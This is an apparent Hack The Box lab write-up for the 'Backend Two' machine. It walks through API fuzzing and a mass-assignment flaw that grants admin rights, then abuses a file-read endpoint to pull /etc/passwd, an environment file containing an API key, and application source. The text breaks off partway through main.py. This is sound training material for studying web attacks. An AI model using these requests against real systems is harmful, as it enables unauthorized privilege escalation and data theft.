# [Backend Two](https://app.hackthebox.com/machines/469)

> A Linux server hosting a custom [FastAPI](https://fastapi.tiangolo.com/) API. Though the API enforces authorization on its endpoints, it contains a vulnerable endpoint that allows any user to give their account administrative privileges. Exploiting this vulnerability grants elevated access to the API. The API contains endpoints only accessible to administrators that grant file read and file write capabilities. The file write endpoint requires a `debug` key in a user's JWT which is not default even in JWTs granted to administrators. However, the file read endpoint can be leveraged to leak the API's JWT secret, making it possible to forge a JWT with the `debug` key and access the file write endpoint. Both the file read and file write endpoints contain statements importing `base64.py` without a full path. By writing arbitrary Python code in `base64.py` in the application's current directory and then invoking one of those endpoints, it is possible to achieve remote code execution. With command execution on the server, the current user's password can be found in the API's authentication log. However, the server requires a user to beat a game of Wordle to execute `sudo`. After finding the game's dictionary and beating the game, the current user can run any command as any user using `sudo`, granting elevated access.

---

## Open Port Enumeration

### TCP

```bash
$ sudo masscan -p1-65535 10.129.227.139 --rate=1000 -e tun0 --output-format grepable --output-filename enum/backend-two.masscan
$ cat enum/backend-two.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

OpenSSH banner indicates Ubuntu 20.04.

The application on port 80 appears to be an API. Its server header is [uvicorn](https://www.uvicorn.org/), indicating it is likely powered by a Python backend web application framework. Several requests return JSON responses, one of which indicates it is indeed an API.

```bash
$ nmap -sC -sV -p22,80 10.129.227.139 -oA enum/backend-two
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-26 20:28 EDT
Nmap scan report for 10.129.227.139
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA)
|   256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA)
|_  256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519)
80/tcp open  http    uvicorn
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     content-type: text/plain; charset=utf-8
|     Connection: close
|     Invalid HTTP request received.
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     date: Sat, 27 Aug 2022 00:28:44 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"detail":"Not Found"}
|   GetRequest:
|     HTTP/1.1 200 OK
|     date: Sat, 27 Aug 2022 00:28:32 GMT
|     server: uvicorn
|     content-length: 22
|     content-type: application/json
|     Connection: close
|     {"msg":"UHC Api v2.0"}
|   HTTPOptions:
|     HTTP/1.1 405 Method Not Allowed
|     date: Sat, 27 Aug 2022 00:28:38 GMT
|     server: uvicorn
|     content-length: 31
|     content-type: application/json
|     Connection: close
|_    {"detail":"Method Not Allowed"}
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.92%I=7%D=8/26%Time=63096538%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,A6,"HTTP/1\.1\x20200\x20OK\r\ndate:\x20Sat,\x2027\x20Aug\x202022
SF:\x2000:28:32\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2022\r\nc
SF:ontent-type:\x20application/json\r\nConnection:\x20close\r\n\r\n{\"msg\
SF:":\"UHC\x20Api\x20v2\.0\"}")%r(HTTPOptions,BF,"HTTP/1\.1\x20405\x20Meth
SF:od\x20Not\x20Allowed\r\ndate:\x20Sat,\x2027\x20Aug\x202022\x2000:28:38\
SF:x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\x2031\r\ncontent-type:\
SF:x20application/json\r\nConnection:\x20close\r\n\r\n{\"detail\":\"Method
SF:\x20Not\x20Allowed\"}")%r(RTSPRequest,76,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x
SF:20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(FourOhFourR
SF:equest,AD,"HTTP/1\.1\x20404\x20Not\x20Found\r\ndate:\x20Sat,\x2027\x20A
SF:ug\x202022\x2000:28:44\x20GMT\r\nserver:\x20uvicorn\r\ncontent-length:\
SF:x2022\r\ncontent-type:\x20application/json\r\nConnection:\x20close\r\n\
SF:r\n{\"detail\":\"Not\x20Found\"}")%r(GenericLines,76,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nC
SF:onnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r
SF:(DNSVersionBindReqTCP,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent
SF:-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nI
SF:nvalid\x20HTTP\x20request\x20received\.")%r(DNSStatusRequestTCP,76,"HTT
SF:P/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;\x20char
SF:set=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20request\x20
SF:received\.")%r(SSLSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:content-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\nInvalid\x20HTTP\x20request\x20received\.")%r(TerminalServerCookie
SF:,76,"HTTP/1\.1\x20400\x20Bad\x20Request\r\ncontent-type:\x20text/plain;
SF:\x20charset=utf-8\r\nConnection:\x20close\r\n\r\nInvalid\x20HTTP\x20req
SF:uest\x20received\.")%r(TLSSessionReq,76,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\ncontent-type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\nInvalid\x20HTTP\x20request\x20received\.");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.77 seconds
```

### UDP

Nothing of significance here.

```bash
$ sudo nmap -sU 10.129.227.139
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-26 20:34 EDT
Nmap scan report for 10.129.227.139
Host is up (0.024s latency).
Not shown: 999 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1016.55 seconds
```

---

## API Endpoint Enumeration

A plain `HTTP GET` request to `/` yields a JSON object that indicates the UHC API Version 2.0.

```bash
$ curl -v http://10.129.227.139
*   Trying 10.129.227.139:80...
* Connected to 10.129.227.139 (10.129.227.139) port 80 (#0)
> GET / HTTP/1.1
> Host: 10.129.227.139
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< date: Wed, 31 Aug 2022 16:56:45 GMT
< server: uvicorn
< content-length: 22
< content-type: application/json
<
* Connection #0 to host 10.129.227.139 left intact
{"msg":"UHC Api v2.0"}
```

With the mindset that the target is likely an API, discover endpoints using API-specific wordlists. Fuzzing the root yields the endpoints `/api` and `/docs`. The latter returns a 401, indicating it requires authentication.

```bash
$ patator http_fuzz method=GET url='http://10.129.227.139/FILE0' 0=objects.txt -x ignore:code=404
20:45:49 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-26 20:45 EDT
20:45:49 patator    INFO -
20:45:49 patator    INFO - code size:clen       time | candidate                          |   num | mesg
20:45:49 patator    INFO - -----------------------------------------------------------------------------
20:45:50 patator    INFO - 200  144:19         0.057 | api                                |   131 | HTTP/1.1 200 OK
20:45:53 patator    INFO - 401  191:30         0.097 | docs                               |   575 | HTTP/1.1 401 Unauthorized
20:46:12 patator    INFO - Hits/Done/Skip/Fail/Size: 2/3132/0/0/3132, Avg: 136 r/s, Time: 0h 0m 22s
```

Fuzzing `/api` yields the endpoint `/api/v1`.

```bash
$ patator http_fuzz method=GET url='http://10.129.227.139/api/FILE0' 0=objects.txt -x ignore:code=404
20:50:15 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-26 20:50 EDT
20:50:15 patator    INFO -
20:50:15 patator    INFO - code size:clen       time | candidate                          |   num | mesg
20:50:15 patator    INFO - -----------------------------------------------------------------------------
20:50:29 patator    INFO - 200  157:32         0.112 | v1                                 |  1894 | HTTP/1.1 200 OK
20:50:38 patator    INFO - Hits/Done/Skip/Fail/Size: 1/3132/0/0/3132, Avg: 133 r/s, Time: 0h 0m 23s
```

Fuzzing `/api/v1` yields the endpoint `/api/v1/admin`, which redirects to `/api/v1/admin/`, which yields a 401. Navigating to `/api/v1` also yields the endpoint `/api/v1/user`.

```bash
$ patator http_fuzz method=GET url='http://10.129.227.139/api/v1/FILE0' 0=objects.txt -x ignore:code=404
13:02:23 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-31 13:02 EDT
13:02:23 patator    INFO -
13:02:23 patator    INFO - code size:clen       time | candidate                          |   num | mesg
13:02:23 patator    INFO - -----------------------------------------------------------------------------
13:02:23 patator    INFO - 307  169:-1         0.045 | admin                              |    76 | HTTP/1.1 307 Temporary Redirect
13:02:45 patator    INFO - Hits/Done/Skip/Fail/Size: 1/3132/0/0/3132, Avg: 143 r/s, Time: 0h 0m 21s
```

```bash
$ curl -v http://10.129.227.139/api/v1/admin
*   Trying 10.129.227.139:80...
* Connected to 10.129.227.139 (10.129.227.139) port 80 (#0)
> GET /api/v1/admin HTTP/1.1
> Host: 10.129.227.139
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 307 Temporary Redirect
< date: Wed, 31 Aug 2022 17:04:31 GMT
< server: uvicorn
< location: http://10.129.227.139/api/v1/admin/
< Transfer-Encoding: chunked
<
* Connection #0 to host 10.129.227.139 left intact

$ curl -v http://10.129.227.139/api/v1/admin/
*   Trying 10.129.227.139:80...
* Connected to 10.129.227.139 (10.129.227.139) port 80 (#0)
> GET /api/v1/admin/ HTTP/1.1
> Host: 10.129.227.139
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Unauthorized
< date: Wed, 31 Aug 2022 17:04:32 GMT
< server: uvicorn
< www-authenticate: Bearer
< content-length: 30
< content-type: application/json
<
* Connection #0 to host 10.129.227.139 left intact
{"detail":"Not authenticated"}
```

```bash
$ curl -v http://10.129.227.139/api/v1
*   Trying 10.129.227.139:80...
* Connected to 10.129.227.139 (10.129.227.139) port 80 (#0)
> GET /api/v1 HTTP/1.1
> Host: 10.129.227.139
> User-Agent: curl/7.74.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< date: Wed, 31 Aug 2022 17:03:51 GMT
< server: uvicorn
< content-length: 32
< content-type: application/json
<
* Connection #0 to host 10.129.227.139 left intact
{"endpoints":["/user","/admin"]}
```

Interestingly, `/api/v1/user` returns a 404. Assuming typical API nomenclature, fuzz for an identifier integer after `user/`. This shows `/api/v1/user/$N` is valid, where `$N` is an integer between 1 and 11. These likely represent users.

```bash
$ patator http_fuzz method=GET url='http://10.129.227.139/api/v1/user/RANGE0' 0=int:0-500 -x ignore:code=404 -x ignore:clen=4
21:05:06 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-26 21:05 EDT
21:05:06 patator    INFO -
21:05:06 patator    INFO - code size:clen       time | candidate                          |   num | mesg
21:05:06 patator    INFO - -----------------------------------------------------------------------------
21:05:06 patator    INFO - 200  303:177        0.059 | 10                                 |    11 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  301:175        0.076 | 1                                  |     2 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  306:180        0.063 | 11                                 |    12 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  302:176        0.065 | 2                                  |     3 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  304:178        0.065 | 3                                  |     4 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  306:180        0.076 | 4                                  |     5 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  303:177        0.070 | 5                                  |     6 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  303:177        0.064 | 6                                  |     7 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  306:180        0.052 | 7                                  |     8 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  305:179        0.056 | 8                                  |     9 | HTTP/1.1 200 OK
21:05:06 patator    INFO - 200  301:175        0.071 | 9                                  |    10 | HTTP/1.1 200 OK
21:05:10 patator    INFO - Hits/Done/Skip/Fail/Size: 11/501/0/0/501, Avg: 107 r/s, Time: 0h0m 4s
```

Fuzzing `user/` with the `POST` method and for non-integer endpoints yields `login` and `signup`. `cgi-bin` does nothing.

```bash
$ patator http_fuzz method=POST url='http://10.129.227.139/api/v1/user/FILE0' 0=objects.txt -x ignore:code=404 -x ignore:code=405
21:21:08 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.8 at 2022-08-26 21:21 EDT
21:21:08 patator    INFO -
21:21:08 patator    INFO - code size:clen       time | candidate                          |   num | mesg
21:21:08 patator    INFO - -----------------------------------------------------------------------------
21:21:10 patator    INFO - 307  175:-1         0.053 | cgi-bin/                           |   322 | HTTP/1.1 307 Temporary Redirect
21:21:16 patator    INFO - 422  316:172        0.059 | login                              |  1070 | HTTP/1.1 422 Unprocessable Entity
21:21:20 patator    INFO - 422  224:81         0.052 | signup                             |  1632 | HTTP/1.1 422 Unprocessable Entity
21:21:32 patator    INFO - Hits/Done/Skip/Fail/Size: 3/3132/0/0/3132, Avg: 130 r/s, Time: 0h 0m 23s
```

### Final Endpoint Map

- `/`
	- `GET /api`: 200
		- `GET /api/v1`: 200
			- `GET /api/v1/user/$N`, where `$N` is 1-11: 200
			- `POST /api/v1/user/login`: 200
			- `POST /api/v1/user/signup`: 200
			- `GET /api/v1/admin`: 307 --> `GET /api/v1/admin/`: 401 Unauthorized
	- `GET /docs`: 401 Unauthorized

### User Enumeration

According to the `profile` attribute, `admin@backendtwo.htb` is the only administrator.

```bash
$ for i in $(seq 1 11); do curl -s http://10.129.227.139/api/v1/user/$i | jq .; done
{
  "guid": "25d386cd-b808-4107-8d3a-4277a0443a6e",
  "email": "admin@backendtwo.htb",
  "profile": "UHC Admin",
  "last_update": null,
  "time_created": 1650987800991,
  "is_superuser": true,
  "id": 1
}
{
  "guid": "89c0b058-2ae2-49f8-bb07-5e8dcb2d196c",
  "email": "guest@backendtwo.htb",
  "profile": "UHC Guest",
  "last_update": null,
  "time_created": 1650987817546,
  "is_superuser": false,
  "id": 2
}
{
  "guid": "ed63f350-2b39-4aef-9acc-ce3da85a7f2c",
  "email": "big0us@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987858731,
  "is_superuser": false,
  "id": 3
}
{
  "guid": "732b806f-b576-4ed1-bc4f-286c593c5946",
  "email": "celesian@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987862257,
  "is_superuser": false,
  "id": 4
}
{
  "guid": "b76065ed-3677-4f67-9bea-077ce9b4d0e6",
  "email": "luska@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987868441,
  "is_superuser": false,
  "id": 5
}
{
  "guid": "74f9abab-297e-48f6-9574-14f669c704eb",
  "email": "otafe@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987872364,
  "is_superuser": false,
  "id": 6
}
{
  "guid": "637d28c3-3cee-426c-af7c-d49848b84653",
  "email": "watchdog@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987876404,
  "is_superuser": false,
  "id": 7
}
{
  "guid": "e76f9045-cbe1-484a-aaa0-7d8a81a3c8d5",
  "email": "mydonut@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987882171,
  "is_superuser": false,
  "id": 8
}
{
  "guid": "856dbb4b-8d6c-492f-81a9-17af62f98794",
  "email": "bee@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987915911,
  "is_superuser": false,
  "id": 9
}
{
  "guid": "48315ba5-4a93-4b9d-95ea-1af0cf41ff27",
  "email": "waid@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987919215,
  "is_superuser": false,
  "id": 10
}
{
  "guid": "e412dc13-282f-45d8-80e3-7cabb5e73373",
  "email": "freddie@backendtwo.htb",
  "profile": "UHC Player",
  "last_update": null,
  "time_created": 1650987948365,
  "is_superuser": false,
  "id": 11
}
```

---

## User Registration & Authentication

Register an account with credential `tgihf@backendtwo.htb`:`blah`.

```bash
$ curl -s -X POST -H 'Content-Type: application/json' -d '{"email": "tgihf@backendtwo.htb", "password": "blah"}' http://10.129.227.139/api/v1/user/signup
{}
```

Authenticate as this user, yielding a JWT.

```bash
$ curl -s -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=tgihf@backendtwo.htb&password=blah' http://10.129.227.139/api/v1/user/login | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU1NDg0LCJpYXQiOjE2NjE1NjQyODQsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjhjMjg5NjAzLTdiYTUtNGRjYy05ZjdiLTUwYzdhMjQ4OTg0YiJ9.JaI2VfV8agu2GfjK9t-5JFg7LSTsd76VCmW5Lce8chA",
  "token_type": "bearer"
}
```

---

## Authorized Enumeration

With authenticated access, retrieve the documentation from `/docs`. It references a SwaggerAPI description at `/openapi.json`.

```bash
$ curl -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU1NDg0LCJpYXQiOjE2NjE1NjQyODQsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjhjMjg5NjAzLTdiYTUtNGRjYy05ZjdiLTUwYzdhMjQ4OTg0YiJ9.JaI2VfV8agu2GfjK9t-5JFg7LSTsd76VCmW5Lce8chA' -s http://10.129.227.139/docs

    <!DOCTYPE html>
    <html>
    <head>
    <link type="text/css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swagger-ui-dist@4/swagger-ui.css">
    <link rel="shortcut icon" href="https://fastapi.tiangolo.com/img/favicon.png">
    <title>docs</title>
    </head>
    <body>
    <div id="swagger-ui">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/swagger-ui-dist@4/swagger-ui-bundle.js"></script>
    <!-- `SwaggerUIBundle` is now available on the page -->
    <script>
    const ui = SwaggerUIBundle({
        url: '/openapi.json',
    "dom_id": "#swagger-ui",
"layout": "BaseLayout",
"deepLinking": true,
"showExtensions": true,
"showCommonExtensions": true,

    presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIBundle.SwaggerUIStandalonePreset
        ],
    })
    </script>
    </body>
    </html>
```

![](images/Pasted%20image%2020220826215815.png)

![](images/Pasted%20image%2020220826215840.png)

![](images/Pasted%20image%2020220826215848.png)

---

## API Privilege Escalation

The `PUT /api/v1/user/$ID/edit` allows a user to change their `profile` attribute.

```bash
$ curl -s -X PUT -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU1NDg0LCJpYXQiOjE2NjE1NjQyODQsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjhjMjg5NjAzLTdiYTUtNGRjYy05ZjdiLTUwYzdhMjQ4OTg0YiJ9.JaI2VfV8agu2GfjK9t-5JFg7LSTsd76VCmW5Lce8chA' -H 'Content-Type: application/json' -d '{"profile": "blah"}' http://10.129.227.139/api/v1/user/12/edit
{"result":"true"}
```

The endpoint should be implemented such that it only allows users to update thier `profile` attribute. However, it appears that if an a JSON object with other attributes defined is input, the endpoint updates those attributes as well. The attribute that appears to differentiate between an administrator and a non-administrator is the `is_superuser` attribute. Leverage this vulnerability to set the current user's `is_superuser` value to `true`, making them an administrator.

```bash
$ curl -s -X PUT -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU1NDg0LCJpYXQiOjE2NjE1NjQyODQsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjpmYWxzZSwiZ3VpZCI6IjhjMjg5NjAzLTdiYTUtNGRjYy05ZjdiLTUwYzdhMjQ4OTg0YiJ9.JaI2VfV8agu2GfjK9t-5JFg7LSTsd76VCmW5Lce8chA' -H 'Content-Type: application/json' -d '{"profile": "blah", "is_superuser": true}' PUT http://10.129.227.139/api/v1/user/12/edit
{"result":"true"}                                                                                                                                           
$ curl -s http://10.129.227.139/api/v1/user/12 | jq
{
  "guid": "8c289603-7ba5-4dcc-9f7b-50c7a248984b",
  "email": "tgihf@backendtwo.htb",
  "profile": "blah",
  "last_update": null,
  "time_created": 1661563880203,
  "is_superuser": true,
  "id": 12
}
```

Reauthenticate to obtain an administrator JWT.

```bash
$ curl -s -X 'POST' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=tgihf@backendtwo.htb&password=blah' http://10.129.227.139/api/v1/user/login | jq
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk",
  "token_type": "bearer"
}
```

Use the administrator JWT to get the user flag from `/api/v1/admin/get_user_flag`.

```bash
$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/get_user_flag
{"file":"..."}
```

---

## Leaking the API Source Code

With administrative access, it is possible to interact with the file read and write endpoints. Leveraging the file read endpoint to read `/etc/passwd` indicates the only interactive user is `htb`.

```bash
$ filename=$(echo -n '/etc/passwd' | base64 -w 0) curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename= | jq -r '.file'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
htb:x:1000:1000:htb:/home/htb:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
```

`/proc/self/environ` indicates the application is being ran from `/home/htb`. It also indicates the application's module object is `app.main:app`. This indicates the application's entrypoint is likely in `/home/htb/app/main.py`.

```bash
$ filename=$(echo -n '/proc/self/environ' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename
{"file":"USER=htb\u0000HOME=/home/htb\u0000OLDPWD=/\u0000PORT=80\u0000LOGNAME=htb\u0000JOURNAL_STREAM=9:18105\u0000APP_MODULE=app.main:app\u0000PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0000INVOCATION_ID=5ed1791a3db949e2bca854e432a03ba8\u0000LANG=C.UTF-8\u0000API_KEY=68b329da9893e34099c7d8ad5cb9c940\u0000HOST=0.0.0.0\u0000PWD=/home/htb\u0000"} 
```

Iterate through `/home/htb/app/main.py` and its imports to leak the source code of the administrative endpoints themselves.

```bash
$ filename=$(echo -n '/home/htb/app/main.py' | base64 -w 0); curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjYyMjU3NjgxLCJpYXQiOjE2NjE1NjY0ODEsInN1YiI6IjEyIiwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiOGMyODk2MDMtN2JhNS00ZGNjLTlmN2ItNTBjN2EyNDg5ODRiIn0.PI_NGiM1QT17mdkAG9m0dJFpPp5tTAuBgAxnzG1dNGk' http://10.129.227.139/api/v1/admin/file/$filename | jq -r '.file'
import asyncio
import os

with open('pid','w') as f:
    f.write( str(os.getpid())  )

from fastapi import FastAPI, APIRouter, Query, HTTPException, Request, Depends
from fastapi_contrib.common.responses import UJSONResponse
from fastapi import FastAPI, Depends, HTTPException, status
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.openapi.docs import get_swagger_ui_html
from fastapi.openapi.utils import get_openapi



from typing import Optional, Any
from pathlib import Path
from sqlalchemy.orm import Session



from app.schemas.user import User
from app.api.v1.api import api_router
from app.core.config import settings

from app.api import deps
from app import crud



app = FastAPI(title="UHC API Quals", openapi_url=None, docs_url=None, redoc_url=None)
root_router = APIRouter(default_response_class=UJSONResponse)



@app.get("/", status_code=200)
def root():
    """
    Root GET
    """
    return {"msg": "UHC Api v2.0"}


@app.get("/api", status_code=200)
def root():
    """
    /api endpoints
    """
    return {"endpoints":"/v1"}


@app.get("/api/v1", status_code=200)
def root():
    """
    /api/v1 endpoints
    """
    return {"endpoints":["/user","/admin"]}



@app.get("/docs")
async def get_documentation(
    current_user: User = Depends(deps.parse_token)
    ):
    return get_swagger_ui_html(openapi_url="/openapi.json", title="docs")

@app.get("/openapi.json")
async def openapi(
    current_user: User = Depends(deps.parse_token)
):
    return get_openapi(title = "FastAPI", version="0.1.0", routes=app.routes)

app.include_router(api_router, prefix=settings.API_V1_STR)
app.include_router(root_router)


def start():
